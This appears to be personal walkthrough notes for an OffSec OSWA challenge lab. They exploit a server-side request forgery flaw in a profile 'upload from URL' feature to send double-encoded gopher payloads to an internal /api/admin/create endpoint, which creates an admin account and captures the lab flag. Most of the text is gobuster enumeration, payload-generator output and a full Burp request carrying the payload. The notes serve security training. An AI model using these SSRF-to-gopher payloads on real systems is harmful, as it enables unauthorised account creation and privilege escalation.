Once searching the webpage was able to find a `CREATE ACCOUNT` option for `GUEST USERS`, created credentials with `test@offsec.com` as the user and `test` for the password

![[Pasted image 20241118132058.png]]
once logging in with those credentials navigate to `PROFILE`
![[Pasted image 20241118132240.png]]
realize that a `UPLOAD FROM URL` option exists, this is a quick identifier of a potential `SSRF` vulnerability - insert kali's IP address, `http://192.168.45.155` before hitting `UPLOAD FROM URL` setup `apache2` server
![[Pasted image 20241118132332.png]]
once the `apache2` server is listening hit `UPLOAD FROM URL`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[18Nov2024 17:53:57]-[/home/â€¦/SUT/OSWA/challenge_labs/glaucidium]
â””â”€# systemctl restart apache2       
```
this new web page error is shown
![[Pasted image 20241118132608.png]]
check the apache2 `access.log` and see that a curl happened
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[18Nov2024 18:08:57]-[/home/â€¦/SUT/OSWA/challenge_labs/glaucidium]
â””â”€# tail /var/log/apache2/access.log
192.168.183.121 - - [18/Nov/2024:18:15:09 +0000] "GET / HTTP/1.1" 200 10956 "-" "curl/7.80.0"
```
what it looks like in `burpsuite`
![[Pasted image 20241118132923.png]]

need to use `gopher` to use current guest credntials of `test:test` to create a `admin` account named `admintest:admintest`

step 1:
test for api endpoints - seclists webapi endpoints
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[18Nov2024 19:38:06]-[/usr/â€¦/seclists/Discovery/Web-Content/api]
â””â”€# ls -la                            
total 472
drwxr-xr-x  2 root root   4096 Jun 13 12:33 .
drwxr-xr-x 11 root root  12288 Jun 13 12:33 ..
-rw-r--r--  1 root root   1527 Feb 16  2024 README.md
-rw-r--r--  1 root root    773 Feb 16  2024 actions-lowercase.txt
-rw-r--r--  1 root root    772 Feb 16  2024 actions-uppercase.txt
-rw-r--r--  1 root root   1579 Feb 16  2024 actions.txt
-rw-r--r--  1 root root 204325 Feb 16  2024 api-endpoints-res.txt
-rw-r--r--  1 root root   4123 Feb 16  2024 api-endpoints.txt
-rw-r--r--  1 root root 159335 Feb 16  2024 api-seen-in-wild.txt
-rw-r--r--  1 root root  18414 Feb 16  2024 ispsystem_billmanager_api.txt
-rw-r--r--  1 root root    656 Feb 16  2024 objects-lowercase.txt
-rw-r--r--  1 root root    656 Feb 16  2024 objects-uppercase.txt
-rw-r--r--  1 root root  20882 Feb 16  2024 objects.txt
-rw-r--r--  1 root root  24327 Feb 16  2024 salesforce-aura-objects.txt

```


api-test.txt creation to test for web api endpoints
```bash
/api/admin
/api/admin/login
/api/authenticate
/api/auth
/api/users
/api/admin/dashboard
/api/admin/create
```
`gobuster` to see if exists `405` error means that the endpoint exists, just dont have the privileges to access it
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[18Nov2024 19:43:04]-[/home/â€¦/SUT/OSWA/challenge_labs/glaucidium]
â””â”€# gobuster dir -u http://glaucidium:80 -w api-test.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://glaucidium:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                api-test.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api/admin/login      (Status: 405) [Size: 178]
Progress: 7 / 8 (87.50%)
/api/admin/create     (Status: 405) [Size: 178]                                                      
===============================================================
Finished
===============================================================

```
once we know the ` api endpoint` we can use a tool like `SSRF2gopher.py` to create payloads

I input comments for explanation of fields
```python
â”Œâ”€â”€(rootðŸ’€gobots)-[18Nov2024 19:24:03]-[/home/â€¦/OSWA/challenge_labs/glaucidium/SSRF2gopher-main]
â””â”€# python3 SSRF2gopher.py

   ___________  _______                 __          
  / __/ __/ _ \/ __/_  |___ ____  ___  / /  ___ ____
 _\ \_\ \/ , _/ _// __// _ `/ _ \/ _ \/ _ \/ -_) __/
/___/___/_/|_/_/ /____/\_, /\___/ .__/_//_/\__/_/   
                      /___/    /_/                  

Created by eMVee 
    
[?] What is the address of the Host? # the host that is going to be exploited
127.0.0.1
[?] What port should be used for gopher? # the port that gopher is going to use - typically 80
80
[?] What endpoint should be used for gopher? # the endpoint that is going to be targeted - in this case to create an admin user
/api/admin/create
[?] What data would you like to post?  # the credentials that are going to be created
username=admintest&password=admintest

[!] Plain text payload:


gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

username=admintest&password=admintest

[!] URL encoded payload:
gopher://127.0.0.1:80/_POST%20/api/admin/create%20HTTP/1.1%0aHost:%20127.0.0.1%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2037%0a%0ausername%3dadmintest%26password%3dadmintest

[!] Double URL encoded payload:
gopher%3a//127.0.0.1%3a80/_POST%2520/api/admin/create%2520HTTP/1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application/x-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest

[!] Another option that might work via something like BURP: # this payload worked
gopher%3a%2F%2F127.0.0.1%3a80%2F_POST%2520%2Fapi%2Fadmin%2Fcreate%2520HTTP%2F1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application%2Fx-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest

```
in order for `gopher` to work it typically has to be double encoded, if you use the `BURPSUITE` decode we can see what the `gopher` is actually doing
![[Pasted image 20241118153845.png]]
double de-encoded payload
```bash
gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

username=admintest&password=admintest
```
before double encoding on a one line
```http
gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 37\n\nusername=admintest&password=admintest
```
once getting a proper payload working with `SSRF2Gopher` this was the full payload - ensure to get a burp request that you are logged in as the user created first
```http
POST /api/user/preview/cv HTTP/1.1
Host: glaucidium
Content-Length: 251
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: */*
Origin: http://glaucidium
Referer: http://glaucidium/private/user/profile
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJyrViotTi2KT8tLzE1VslIqSS0uUdKBiGWmKFkZQ9kllQUgaRBbqRYA4IkR9Q.ZzuDPQ.ww9yhZnRpbfCELSv5tv2o9lWPoE
Connection: keep-alive

cv=gopher%3a%2F%2F127.0.0.1%3a80%2F_POST%2520%2Fapi%2Fadmin%2Fcreate%2520HTTP%2F1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application%2Fx-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest
```
placed into the `cv` parameter and see that account was created
![[Pasted image 20241118154723.png]]
login into the employee login with the created credentials `admintest:admintest`
![[Pasted image 20241118154927.png]]
and retrieve `local.txt` as well as admin access
```
local.txt: 45f5fb14831b5364066c37d57a93aebf
```
![[Pasted image 20241118143533.png]]

```bash
gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a
```